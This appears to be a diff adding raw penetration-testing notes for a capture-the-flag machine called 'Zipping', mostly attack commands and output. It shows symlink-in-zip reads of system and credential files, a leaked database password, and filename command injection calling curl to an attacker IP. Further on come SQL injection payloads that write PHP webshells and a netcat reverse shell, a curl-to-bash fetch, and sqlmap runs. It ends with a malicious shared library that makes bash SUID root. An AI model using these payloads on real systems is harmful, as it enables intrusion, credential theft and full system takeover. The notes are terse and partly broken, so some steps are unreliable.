@@ -1,0 +1,579 @@
+
+
+
+----------------------------------------------------------------------------------------------------------------------------------
+
+└─$ nmap -sCV -Pn -p- --open 10.10.11.229 -o zipping-nmap
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-30 14:39 +07
+Nmap scan report for 10.10.11.229
+Host is up (0.059s latency).
+Not shown: 60466 closed tcp ports (conn-refused), 5067 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.0p1 Ubuntu 1ubuntu7.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 9d:6e:ec:02:2d:0f:6a:38:60:c6:aa:ac:1e:e0:c2:84 (ECDSA)
+|_  256 eb:95:11:c7:a6:fa:ad:74:ab:a2:c5:f6:a4:02:18:41 (ED25519)
+80/tcp open  http    Apache httpd 2.4.54 ((Ubuntu))
+|_http-server-header: Apache/2.4.54 (Ubuntu)
+|_http-title: Zipping | Watch store
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 35.17 seconds
+
+
+----------------------------------------------------------------------------------------------------------------------------------
+
+ln -s /etc/hosts ./host.pdf
+zip host.zip -y host.pdf 
+
+ln -s /etc/passwd ./passwd.pdf
+zip passwd.zip -y passwd.pdf 
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-timesync:x:102:103:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
+systemd-resolve:x:104:110:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+pollinate:x:105:1::/var/cache/pollinate:/bin/false
+sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
+rektsu:x:1001:1001::/home/rektsu:/bin/bash
+mysql:x:107:115:MySQL Server,,,:/nonexistent:/bin/false
+_laurel:x:999:999::/var/log/laurel:/bin/false
+
+
+ln -s /etc/shadow ./shadow.pdf ==> not work
+zip shadow.zip -y shadow.pdf 
+
+
+ln -s /home/rektsu/.ssh/id_rsa ./id_rsa.pdf
+zip id_rsa.zip -y id_rsa.pdf 
+
+ln -s /etc/apache2/envvars ./envvars.pdf
+zip envvars.zip -y envvars.pdf 
+
+export APACHE_RUN_USER=rektsu
+export APACHE_RUN_GROUP=rektsu
+
+ln -s /etc/apache2/sites-available/000-default.conf ./default.pdf
+zip default.zip -y default.pdf 
+
+	ServerAdmin webmaster@localhost
+	DocumentRoot /var/www/html
+
+	<Directory /var/www/html/uploads>
+		Options -Indexes
+	</Directory>	
+
+ln -s /var/www/html/uploads/.htaccess ./htaccess.pdf #==> not work
+zip htaccess.zip -y htaccess.pdf 
+
+ln -s /var/www/html/upload.php ./upload.pdf
+zip upload.zip -y upload.pdf 
+
+<?php
+            if(isset($_POST['submit'])) {
+              // Get the uploaded zip file
+              $zipFile = $_FILES['zipFile']['tmp_name'];
+              if ($_FILES["zipFile"]["size"] > 300000) {
+                echo "<p>File size must be less than 300,000 bytes.</p>";
+              } else {
+                // Create an md5 hash of the zip file
+                $fileHash = md5_file($zipFile);
+                // Create a new directory for the extracted files
+                $uploadDir = "uploads/$fileHash/";
+				$tmpDir = sys_get_temp_dir();
+                // Extract the files from the zip
+                $zip = new ZipArchive;
+                if ($zip->open($zipFile) === true) {
+                  if ($zip->count() > 1) {
+                  echo '<p>Please include a single PDF file in the archive.<p>';
+                  } else {
+                  // Get the name of the compressed file
+                  $fileName = $zip->getNameIndex(0);
+                  if (pathinfo($fileName, PATHINFO_EXTENSION) === "pdf") {
+                    $uploadPath = $tmpDir.'/'.$uploadDir;
+                    echo exec('7z e '.$zipFile. ' -o' .$uploadPath. '>/dev/null');
+                    if (file_exists($uploadPath.$fileName)) {
+                      mkdir($uploadDir);
+                      rename($uploadPath.$fileName, $uploadDir.$fileName);
+                    }
+                    echo '<p>File successfully uploaded and unzipped, a staff member will review your resume as soon as possible. Make sure it has been uploaded correctly by accessing the following path:</p><a href="'.$uploadDir.$fileName.'">'.$uploadDir.$fileName.'</a>'.'</p>';
+                  } else {
+                    echo "<p>The unzipped file must have  a .pdf extension.</p>";
+                  }
+                 }
+                } else {
+                  echo "Error uploading file.";
+                }
+
+              }
+            }
+            ?>
+
+
+ln -s /var/www/html/upload.php ./upl\{curl,10.10.16.72\}oad.pdf
+zip upl\{curl,10.10.16.72\}oad.zip -y upl\{curl,10.10.16.72\}oad.pdf 
+
+ln -s /var/www/html/shop/index.php ./shop.pdf
+zip shop.zip -y shop.pdf 
+
+<?php
+session_start();
+// Include functions and connect to the database using PDO MySQL
+include 'functions.php';
+$pdo = pdo_connect_mysql();
+// Page is set to home (home.php) by default, so when the visitor visits, that will be the page they see.
+$page = isset($_GET['page']) && file_exists($_GET['page'] . '.php') ? $_GET['page'] : 'home';  ==>> this ***
+// Include and show the requested page
+include $page . '.php';
+?>
+
+
+
+ln -s /var/www/html/shop/functions.php ./functions.pdf
+zip functions.zip -y functions.pdf 
+
+<?php
+function pdo_connect_mysql() {
+    // Update the details below with your MySQL details
+    $DATABASE_HOST = 'localhost';
+    $DATABASE_USER = 'root';
+    $DATABASE_PASS = 'MySQL_P@ssw0rd!';
+    $DATABASE_NAME = 'zipping';
+    try {
+    	return new PDO('mysql:host=' . $DATABASE_HOST . ';dbname=' . $DATABASE_NAME . ';charset=utf8', $DATABASE_USER, $DATABASE_PASS);
+    } catch (PDOException $exception) {
+    	// If there is an error with the connection, stop the script and display the error.
+    	exit('Failed to connect to database!');
+    }
+}
+
+rektsu
+MySQL_P@ssw0rd!
+
+ln -s /var/www/html/shop/functions.php ./functions.pdf
+zip functions.zip -y functions.pdf
+
+ln -s /var/www/html/shop/home.php ./home1.pdf
+zip home.zip -y home1.pdf
+
+<?php
+// Get the 4 most recently added products
+$stmt = $pdo->prepare('SELECT * FROM products ORDER BY date_added DESC LIMIT 4');
+$stmt->execute();
+$recently_added_products = $stmt->fetchAll(PDO::FETCH_ASSOC);
+?>
+<?=template_header('Zipping | Home')?>
+
+<div class="featured">
+    <h2>Watches</h2>
+    <p>The perfect watch for every occasion</p>
+</div>
+<div class="recentlyadded content-wrapper">
+    <h2>Recently Added Products</h2>
+    <div class="products">
+        <?php foreach ($recently_added_products as $product): ?>
+        <a href="index.php?page=product&id=<?=$product['id']?>" class="product">
+            <img src="assets/imgs/<?=$product['img']?>" width="200" height="200" alt="<?=$product['name']?>">
+            <span class="name"><?=$product['name']?></span>
+            <span class="price">
+                &dollar;<?=$product['price']?>
+                <?php if ($product['rrp'] > 0): ?>
+                <span class="rrp">&dollar;<?=$product['rrp']?></span>
+                <?php endif; ?>
+            </span>
+        </a>
+        <?php endforeach; ?>
+    </div>
+</div>
+
+<?=template_footer()?>
+
+ln -s /var/www/html/shop/functions.php 'func`sleep 10`tions.pdf'
+zip functions.zip -y 'func`sleep 10`tions.pdf'
+
+
+upload;curl 10.10.16.72;abc.pdf
+ln -s /var/www/html/shop/functions.php upload\;curl\ 10.10.16.72\;abc.pdf
+zip functions.zip -y upload\;curl\ 10.10.16.72\;abc.pdf
+
+7z e abc;{curl,10.10.16.72};asd.pdf -o ./ >/dev/null
+
+ln -s /var/www/html/shop/functions.php abc\;\{curl,10.10.16.72\}\;asd.pdf
+zip RCE.zip -y abc\;\{curl,10.10.16.72\}\;asd.pdf
+
+7z e abc$({curl,10.10.16.72})asd.pdf -o ./ >/dev/null
+
+ln -s /var/www/html/shop/functions.php abc\$\(\{curl,10.10.16.72\}\)asd.pdf
+zip functions.zip -y abc\$\(\{curl,10.10.16.72\}\)asd.pdf
+
+
+ln -s /home/rektsu/.ssh/authorized_keys  authorized_keys.pdf
+zip authorized_keys.zip -y authorized_keys.pdf
+
+
+ln -s /var/www/html/shop/product.php  product.pdf
+zip product.zip -y product.pdf
+
+<?php
+// Check to make sure the id parameter is specified in the URL
+if (isset($_GET['id'])) {
+    $id = $_GET['id'];
+    // Filtering user input for letters or special characters
+    if(preg_match("/^.*[A-Za-z!#$%^&*()\-_=+{}\[\]\\|;:'\",.<>\/?]|[^0-9]$/", $id, $match)) {
+        header('Location: index.php');
+    } else {
+        // Prepare statement and execute, but does not prevent SQL injection
+        $stmt = $pdo->prepare("SELECT * FROM products WHERE id = '$id'");
+        $stmt->execute();
+        // Fetch the product from the database and return the result as an Array
+        $product = $stmt->fetch(PDO::FETCH_ASSOC);
+        // Check if the product exists (array is not empty)
+        if (!$product) {
+            // Simple error to display if the id for the product doesn't exists (array is empty)
+            exit('Product does not exist!');
+        }
+    }
+} else {
+    // Simple error to display if the id wasn't specified
+    exit('No ID provided!');
+}
+?>
+
+<?=template_header('Zipping | Product')?>
+
+<div class="product content-wrapper">
+    <img src="assets/imgs/<?=$product['img']?>" width="500" height="500" alt="<?=$product['name']?>">
+    <div>
+        <h1 class="name"><?=$product['name']?></h1>
+        <span class="price">
+            &dollar;<?=$product['price']?>
+            <?php if ($product['rrp'] > 0): ?>
+            <span class="rrp">&dollar;<?=$product['rrp']?></span>
+            <?php endif; ?>
+        </span>
+        <form action="index.php?page=cart" method="post">
+            <input type="number" name="quantity" value="1" min="1" max="<?=$product['quantity']?>" placeholder="Quantity" required>
+            <input type="hidden" name="product_id" value="<?=$product['id']?>">
+            <input type="submit" value="Add To Cart">
+        </form>
+        <div class="description">
+            <?=$product['desc']?>
+        </div>
+    </div>
+</div>
+
+<?=template_footer()?>
+
+
+ln -s /var/www/html/shop/cart.php  cart.pdf
+zip cart.zip -y cart.pdf
+
+<?php
+// If the user clicked the add to cart button on the product page we can check for the form data
+if (isset($_POST['product_id'], $_POST['quantity'])) {
+    // Set the post variables so we easily identify them, also make sure they are integer
+    $product_id = $_POST['product_id'];
+    $quantity = $_POST['quantity'];
+    // Filtering user input for letters or special characters
+    if(preg_match("/^.*[A-Za-z!#$%^&*()\-_=+{}\[\]\\|;:'\",.<>\/?]|[^0-9]$/", $product_id, $match) || preg_match("/^.*[A-Za-z!#$%^&*()\-_=+{}[\]\\|;:'\",.<>\/?]/i", $quantity, $match)) {
+        echo '';
+    } else {
+        // Construct the SQL statement with a vulnerable parameter
+        $sql = "SELECT * FROM products WHERE id = '" . $_POST['product_id'] . "'";
+        // Execute the SQL statement without any sanitization or parameter binding
+        $product = $pdo->query($sql)->fetch(PDO::FETCH_ASSOC);
+        // Check if the product exists (array is not empty)
+        if ($product && $quantity > 0) {
+            // Product exists in database, now we can create/update the session variable for the cart
+            if (isset($_SESSION['cart']) && is_array($_SESSION['cart'])) {
+                if (array_key_exists($product_id, $_SESSION['cart'])) {
+                    // Product exists in cart so just update the quanity
+                    $_SESSION['cart'][$product_id] += $quantity;
+                } else {
+                    // Product is not in cart so add it
+                    $_SESSION['cart'][$product_id] = $quantity;
+                }
+            } else {
+                // There are no products in cart, this will add the first product to cart
+                $_SESSION['cart'] = array($product_id => $quantity);
+            }
+        }
+        // Prevent form resubmission...
+        header('location: index.php?page=cart');
+        exit;
+    }
+}
+
+// Remove product from cart, check for the URL param "remove", this is the product id, make sure it's a number and check if it's in the cart
+if (isset($_GET['remove']) && is_numeric($_GET['remove']) && isset($_SESSION['cart']) && isset($_SESSION['cart'][$_GET['remove']])) {
+
+    // Remove the product from the shopping cart
+    unset($_SESSION['cart'][$_GET['remove']]);
+}
+
+// Update product quantities in cart if the user clicks the "Update" button on the shopping cart page
+if (isset($_POST['update']) && isset($_SESSION['cart'])) {
+    // Loop through the post data so we can update the quantities for every product in cart
+    foreach ($_POST as $k => $v) {
+        if (strpos($k, 'quantity') !== false && is_numeric($v)) {
+            $id = str_replace('quantity-', '', $k);
+            $quantity = (int)$v;
+            // Always do checks and validation
+            if (is_numeric($id) && isset($_SESSION['cart'][$id]) && $quantity > 0) {
+                // Update new quantity
+                $_SESSION['cart'][$id] = $quantity;
+            }
+        }
+    }
+    // Prevent form resubmission...
+    header('location: index.php?page=cart');
+    exit;
+}
+
+// Send the user to the place order page if they click the Place Order button, also the cart should not be empty
+if (isset($_POST['placeorder']) && isset($_SESSION['cart']) && !empty($_SESSION['cart'])) {
+    header('Location: index.php?page=placeorder');
+    exit;
+}
+
+if (isset($_POST['clear'])) {
+	unset($_SESSION['cart']);
+}
+
+// Check the session variable for products in cart
+$products_in_cart = isset($_SESSION['cart']) ? $_SESSION['cart'] : array();
+$products = array();
+$subtotal = 0.00;
+// If there are products in cart
+if ($products_in_cart) {
+    // There are products in the cart so we need to select those products from the database
+    // Products in cart array to question mark string array, we need the SQL statement to include IN (?,?,?,...etc)
+    $array_to_question_marks = implode(',', array_fill(0, count($products_in_cart), '?'));
+    $stmt = $pdo->prepare('SELECT * FROM products WHERE id IN (' . $array_to_question_marks . ')'); == > no sqli here
+    // We only need the array keys, not the values, the keys are the id's of the products
+    $stmt->execute(array_keys($products_in_cart));
+    // Fetch the products from the database and return the result as an Array
+    $products = $stmt->fetchAll(PDO::FETCH_ASSOC);
+    // Calculate the subtotal
+    foreach ($products as $product) {
+        $subtotal += (float)$product['price'] * (int)$products_in_cart[$product['id']];
+    }
+}
+?>
+
+<?=template_header('Zipping | Cart')?>
+
+<div class="cart content-wrapper">
+    <h1>Shopping Cart</h1>
+    <form action="index.php?page=cart" method="post">
+        <table>
+            <thead>
+                <tr>
+                    <td colspan="2">Product</td>
+                    <td>Price</td>
+                    <td>Quantity</td>
+                    <td>Total</td>
+                </tr>
+            </thead>
+            <tbody>
+                <?php if (empty($products)): ?>
+                <tr>
+                    <td colspan="5" style="text-align:center;">You have no products added in your Shopping Cart</td>
+                </tr>
+                <?php else: ?>
+                <?php foreach ($products as $product): ?>
+                <tr>
+                    <td class="img">
+                        <a href="index.php?page=product&id=<?=$product['id']?>">
+                            <img src="assets/imgs/<?=$product['img']?>" width="50" height="50" alt="<?=$product['name']?>">
+                        </a>
+                    </td>
+                    <td>
+                        <a href="index.php?page=product&id=<?=$product['id']?>"><?=$product['name']?></a>
+                        <br>
+                        <a href="index.php?page=cart&remove=<?=$product['id']?>" class="remove">Remove</a>
+                    </td>
+                    <td class="price">&dollar;<?=$product['price']?></td>
+                    <td class="quantity">
+                        <input type="number" name="quantity-<?=$product['id']?>" value="<?=$products_in_cart[$product['id']]?>" min="1" max="<?=$product['quantity']?>" placeholder="Quantity" required>
+                    </td>
+                    <td class="price">&dollar;<?=$product['price'] * $products_in_cart[$product['id']]?></td>
+                </tr>
+                <?php endforeach; ?>
+                <?php endif; ?>
+            </tbody>
+        </table>
+        <div class="subtotal">
+            <span class="text">Subtotal</span>
+            <span class="price">&dollar;<?=$subtotal?></span>
+        </div>
+        <div class="buttons">
+            <input type="submit" value="Update" name="update">
+            <input type="submit" value="Place Order" name="placeorder">
+	    <input type="submit" value="Clear" name="clear" onsubmit="">
+        </div>
+    </form>
+</div>
+
+<?=template_footer()?>
+
+
+
+ln -s /var/www/html/shop/placeorder.php  placeorder.pdf
+zip placeorder.zip -y placeorder.pdf
+
+<?=template_header('Zipping | Place Order')?>
+
+<div class="placeorder content-wrapper">
+    <h1>Your Order Has Been Placed</h1>
+    <p>Thank you for ordering with us! We'll contact you by email with your order details.</p>
+</div>
+
+<?=template_footer()?>
+
+ln -s /var/www/html/shop/placeorder.php  placeorder.pdf
+zip placeorder.zip -y placeorder.pdf
+
+
+ln -s /var/log/apache2/access.log  access.pdf
+zip access.zip -y access.pdf
+
+$page = isset($_GET['page']) && file_exists($_GET['page'] . '.php') ? $_GET['page'] : 'home';
+
+test.phar
+GET /shop/index.php?page=phar://10.10.16.72/test.phar)# HTTP/1.1
+
+RCE.phar.pdf
+zip RCE.phar.zip -y RCE.phar.pdf
+
+http://10.10.11.229/shop/index.php?page=/var/www/html/uploads/642007b4b724ffa7a01d37c55df5a751/webshell.php
+
+GET /shop/index.php?page=/var/www/html/shop/placeorder HTTP/1.1
+
+
+cp /home/kali/stuffs/oscp/webshell/p0wny-shell.php p0wny-shell.php#.pdf
+zip p0wny-shell.zip p0wny-shell.php#.pdf
+
+cp /home/kali/stuffs/oscp/webshell/p0wny-shell.php p0wny-shell.php\\x00.pdf
+zip p0wny-shell.zip p0wny-shell.php\\x00.pdf
+
+
+/shop/index.php?page=product&id=1
+
+
+
+
+
+
+
+
+
+
+
+
+select '<?php system(\"curl http://10.10.16.72:8000/revshell.sh|bash\");?>' into outfile '/tmp/rvsl.php';
+
+/shop/index.php?page=product&id=1%0a';select '<?php system(\"/bin/bash -c \'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.16.72 443 >/tmp/f\'\");?>' into outfile '/tmp/revshell123456788.php'; select sleep(10);-- 123
+
+';select '<?php system(\"/bin/bash -c \'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.16.72 443 >/tmp/f\'\");?>' into outfile '/tmp/revshell.php'; select sleep(10);-- 123
+
+
+';select '<?php echo \"Shell\";system($_GET\[\"cmd\"\]); ?>' into outfile '/tmp/webshell123456789.php'; select sleep(10);-- 123
+';select '<?php echo \"Shell\";system($_GET\[\"cmd\"\]); ?>' into outfile '/var/lib/mysql/revshell123456789.php'; select sleep(10);-- 123
+
+file_exists($_GET['page']) can't read /tmp file 
+
+';select '<?php system(\"/bin/bash -c \'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.16.72 443 >/tmp/f\'\");?>' into outfile '/var/lib/mysql/revshell123456789.php'; select sleep(10);-- 123
+GET /shop/index.php?page=product&id=%0a%27%3Bselect%20%27%3C%3Fphp%20system%28%5C%22%2Fbin%2Fbash%20%2Dc%20%5C%27rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20%2Di%202%3E%261%7Cnc%2010%2E10%2E16%2E72%20443%20%3E%2Ftmp%2Ff%5C%27%5C%22%29%3B%3F%3E%27%20into%20outfile%20%27%2Fvar%2Flib%2Fmysql%2Frevshell123456789%2Ephp%27%3B%20select%20sleep%2810%29%3B%2D%2D%20123 HTTP/1.1
+
+
+';select '<?php echo \"Shell\";system($_GET\[\"cmd\"\]); ?>' into outfile '/var/lib/mysql/webshell123456789.php'; select sleep(10);-- 123
+GET /shop/index.php?page=product&id=%0a%27%3Bselect%20%27%3C%3Fphp%20echo%20%5C%22Shell%5C%22%3Bsystem%28%24%5FGET%5C%5B%5C%22cmd%5C%22%5C%5D%29%3B%20%3F%3E%27%20into%20outfile%20%27%2Fvar%2Flib%2Fmysql%2Fwebshell123456789%2Ephp%27%3B%20select%20sleep%2810%29%3B%2D%2D%20123 HTTP/1.1
+GET /shop/index.php?page=/var/lib/mysql/webshell123456789&cmd=id HTTP/1.1 ==>> Shelluid=1001(rektsu) gid=1001(rektsu) groups=1001(rektsu)
+
+
+
+
+
+sqlmap
+
+sqlmap --url 'http://10.10.11.229/shop/index.php?page=product&id=1' --random-agent -p 'id' --dbms=MySQL -o -b --level=5 --risk=3
+
+sqlmap --url 'http://127.0.0.1:8081/?id=*' --random-agent -p 'id' --dbms=MySQL -o -b --level=5 --risk=3 --technique 'BS'
+
+sqlmap --url 'http://127.0.0.1:8081/?id=*' --random-agent -p 'id' --dbms=MySQL -o -b --level=5 --risk=3 --technique 'BS' --batch --dump -D 'zipping' --tabales 
+
+----------------------------------------------------------------------------------------------------------------------------------
+
+rektsu@zipping:/home/rektsu$ sudo -l
+Matching Defaults entries for rektsu on zipping:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User rektsu may run the following commands on zipping:
+    (ALL) NOPASSWD: /usr/bin/stock
+rektsu@zipping:/home/rektsu$ sudo -s
+
+sudo /usr/bin/stock
+St0ckM4nager
+
+ltrace ==> dlopen("/home/rektsu/.config/libcounter."..., 1) 
+
+strace ==>		/home/rektsu/.config/libcounter.so
+
+nano libcounter.c
+
+#include <stdio.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+static void vuln_func() __attribute__((constructor));
+
+void vuln_func(){
+    setuid(0);
+    setgid(0);
+    printf("I'm the bad library\n");
+    system("/usr/bin/chmod 4755 /bin/bash");
+}
+
+
+gcc -shared -o libcounter.so -fPIC libcounter.c
+
+ref:Sudo Privilege Escalation by Overriding Shared Library
+	https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-privilege-escalation-by-overriding-shared-library/
+
+edit to view other file ?
+
+----------------------------------------------------------------------------------------------------------------------------------
+
+
+
+
+
+
+
+
+----------------------------------------------------------------------------------------------------------------------------------
+
+
